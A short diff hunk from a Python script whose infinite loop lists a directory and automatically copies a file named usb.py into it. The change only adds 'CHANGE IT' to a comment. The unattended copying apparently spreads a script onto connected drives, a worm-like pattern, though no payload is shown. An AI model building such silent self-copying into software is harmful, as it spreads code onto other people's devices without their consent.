@@ -49,7 +49,7 @@ while True:
         # directory listing
         entries = os.listdir(f'{x_index}/')
         # automatic copy file
-        _cpfile_ = "F:/usb.py" # source
+        _cpfile_ = "F:/usb.py" # source CHANGE IT
         _cpdest_ = f"{x_index}/" #destination
         shutil.copy2(_cpfile_, _cpdest_) # keeps everything in the file metadata too
         progress = 0
